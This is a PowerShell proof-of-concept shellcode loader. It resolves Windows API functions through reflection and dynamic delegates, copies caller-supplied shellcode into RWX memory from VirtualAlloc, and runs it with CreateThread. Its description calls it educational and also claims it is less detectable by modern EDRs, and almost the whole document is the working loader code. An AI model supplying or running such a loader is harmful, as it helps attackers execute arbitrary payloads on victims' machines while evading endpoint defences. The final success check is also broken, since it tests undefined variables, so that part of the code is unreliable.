function Invoke-ShellcodeViaLocalThread
{
<#
.SYNOPSIS
    This is a simple proof-of-concept for local shellcode execution using PowerShell and Windows API interop.
    The shellcode is written into memory allocated via VirtualAlloc with RWX permissions and executed via CreateThread.
    
    There’s nothing novel here — this method is well-known and widely used. It’s less detectable
    by modern EDRs and serves primarily as an educational demonstration of shellcode execution in PowerShell.

    We resolve the functions dynamically instead of loading them directly into the script.
    
    Notes:
        - I tested this POC on x64 Win11.
        - You can only create an x64 processes on an x64 host architecture.

.DESCRIPTION
    Author: Silentis Vox (@SilentisVox)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.PARAMETER Shellcode
    A byte array containing the raw shellcode to be executed.

.EXAMPLE
    # Create a local thread that executes shellcode.
    # x64 Win10 RS4
    PS C:\> Invoke-ShellcodeViaLocalThread -Shellcode $Shellcode -Verbose
    VERBOSE: [+] Allocated [272] Bytes To 0x1FF987C0000.
    VERBOSE: [+] Copied [272] Bytes To 0x1FF987C0000.
    VERBOSE: [+] Created Thread [14240] And Is Executing.
    VERBOSE: [+] Shellcode Successfully Executed.

#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [Byte[]]$Shellcode
    )

    function Get-Delegate
    {   
        # We can grab a function address easily, but to treat it as such has it's quirks.

        # Every function is tied to the name of it's method. The method must have a
        # brothering contructor, and a parenting type. The type must have a parenting
        # module. The module must have a parenting assembly.

        # So in reverse order, we create an assembly; under the assembly is a type,
        # so we create that; under the type is the constructor, and invocation method.
        # once that is built, we can then return it use ready.

        param(
            [Parameter(Mandatory)]
            [IntPtr]$FunctionAddress,

            [Parameter(Mandatory)]
            [Type[]]$ArgumentTypes,

            [Parameter()]
            [Type]$ReturnType=[Void]
        )

        # Create an in memory assembly where the delegate will reside.

        $AssemblyNameString             = "New Assembly"
        $AssemblyName                   = [Reflection.AssemblyName]::New($AssemblyNameString)
        $AssemblyBuilderAccess          = [Reflection.Emit.AssemblyBuilderAccess]::Run
        $Domain                         = [AppDomain]::CurrentDomain

        $AssemblyBuilder                = $Domain.DefineDynamicAssembly($AssemblyName, $AssemblyBuilderAccess)

        # Define the single module.

        $ModuleNameString               = "New Module"
        $EmitDebug                      = $false

        $ModuleBuilder                  = $AssemblyBuilder.DefineDynamicModule($ModuleNameString, $EmitDebug)

        # Define the single type.

        $TypeNameString                 = "New Type"
        $TypeAttributes                 = "Class, Public, Sealed, AnsiClass, AutoClass"
        $DelegateBaseType               = [MulticastDelegate]

        $TypeBuilder                    = $ModuleBuilder.DefineType($TypeNameString, $TypeAttributes, $DelegateBaseType)

        # Define the contructor needed.

        $ConstructorAttributes          = "RTSpecialName, HideBySig, Public"
        $ConstructorCallingConvention   = [Reflection.CallingConventions]::Standard
        $ImplementationFlags            = "Runtime, Managed"

        $ConstructorBuilder             = $TypeBuilder.DefineConstructor($ConstructorAttributes, $ConstructorCallingConvention, $ArgumentTypes)
        $ConstructorBuilder.SetImplementationFlags($ImplementationFlags)

        # Define the invocation method.

        $MethodNameString               = "Invoke"
        $MethodAttributes               = "Public, HideBySig, NewSlot, Virtual"

        $MethodBuilder                  = $TypeBuilder.DefineMethod($MethodNameString, $MethodAttributes, $ReturnType, $ArgumentTypes)
        $MethodBuilder.SetImplementationFlags($ImplementationFlags)

        # Create the delegate.

        $Delegate                       = $TypeBuilder.CreateType()
        $DelegateInstance               = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $Delegate)

        return $DelegateInstance
    }

    # System.dll contains all of our unconventional types.

    $Assemblies                         = [AppDomain]::CurrentDomain.GetAssemblies()
    $SystemAssembly                     = $null

    foreach ($Assembly in $Assemblies)
    {
        if ($Assembly.GlobalAssemblyCache -and $Assembly.Location.Split("\\")[-1] -eq "System.dll")
        {
            $SystemAssembly             = $Assembly
            break
        }
    }

    $UnsafeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.UnsafeNativeMethods")
    $NativeMethodsType                  = $SystemAssembly.GetType("Microsoft.Win32.NativeMethods")

    # Get the methods needed to grab functions within the dlls.

    $GetModuleHandle                    = $UnsafeMethodsType.GetMethod("GetModuleHandle")
    $GetProcAddress                     = $UnsafeMethodsType.GetMethod("GetProcAddress", [Reflection.BindingFlags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @([IntPtr], [String]), $null);
    
    # Get all of our address pointers to our needed functions.

    $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @([String] "kernel32.dll"))

    $VirtualAllocAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, "VirtualAlloc"))
    $RtlMoveMemoryAddress               = $GetProcAddress.Invoke($null, @($Kernel32Handle, "RtlMoveMemory"))
    $CreateThreadAddress                = $GetProcAddress.Invoke($null, @($Kernel32Handle, "CreateThread"))
    $WaitForSingleObjectAddress         = $GetProcAddress.Invoke($null, @($Kernel32Handle, "WaitForSingleObject"))

    # Create delegates with our function pointers.

    $VirtualAlloc                       = Get-Delegate $VirtualAllocAddress @([IntPtr], [Int], [Int], [Int]) ([IntPtr])
    $RtlMoveMemory                      = Get-Delegate $RtlMoveMemoryAddress @([IntPtr], [Byte[]], [Int]) ([Void])
    $CreateThread                       = Get-Delegate $CreateThreadAddress @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
    $WaitForSingleObject                = Get-Delegate $WaitForSingleObjectAddress @([IntPtr], [Int]) ([Int])

    # Intialize all needed variables.

    $ShellcodeSize                      = $Shellcode.Length

    $AddressPointer                     = [IntPtr]::Zero
    $MEM_COMMIT                         = 0x00001000
    $PAGE_EXECUTE_READWRITE             = 0x40

    # The idea of creating a thread is so very straightforward: We allocate memory, we copy shellcode to that memory,
    # then create a thread whose start point is at that memory.

    # Allocate memory.

    $AllocatedMemoryAddress             = $VirtualAlloc.Invoke($AddressPointer, $ShellcodeSize, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)

    if ($AllocatedMemoryAddress)
    {
        Write-Verbose ("[+] Allocated [$ShellcodeSize] Bytes To 0x{0:X}." -f $AllocatedMemoryAddress.ToInt64())
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] VirtualAlloc Failed: $FunctionError"
        $false
        return
    }

    # Copy shellcode to that memory.

    $RtlMoveMemory.Invoke($AllocatedMemoryAddress, $Shellcode, $ShellcodeSize)

    # Create a thread pointing at that address.

    $TypeAttributes                     = [IntPtr]::Zero
    $StackSize                          = [IntPtr]::Zero
    $Parameters                         = [IntPtr]::Zero
    $CreationFlags                      = 0
    $ThreadId                           = [IntPtr]::Zero

    $ThreadHandle                       = $CreateThread.Invoke($TypeAttributes, $StackSize, $AllocatedMemoryAddress, $Parameters, $CreationFlags, $ThreadId)

    $INVALID_THREAD_HANDLE              = 0xFFFFFFFF

    if (($ThreadHandle) -and ($ThreadHandle -ne $INVALID_THREAD_HANDLE))
    {
        Write-Verbose "[+] Created Thread [$ThreadId] And Is Executing."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] CreateThread Failed: $FunctionError"
        $false
        return
    }

    # Wait until shellcode executed successfully.

    $INFINITE                           = [UInt32]::MaxValue

    $WaitObject                         = $WaitForSingleObject.Invoke($ThreadHandle, $INFINITE)

    if ((-not $Result) -and ($Result -eq $WAIT_OBJECT_0))
    {
        Write-Verbose "[+] Shellcode Successfully Executed."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] WaitForSingleObject Failed: $FunctionError"
        $false
        return
    }

    return $true
}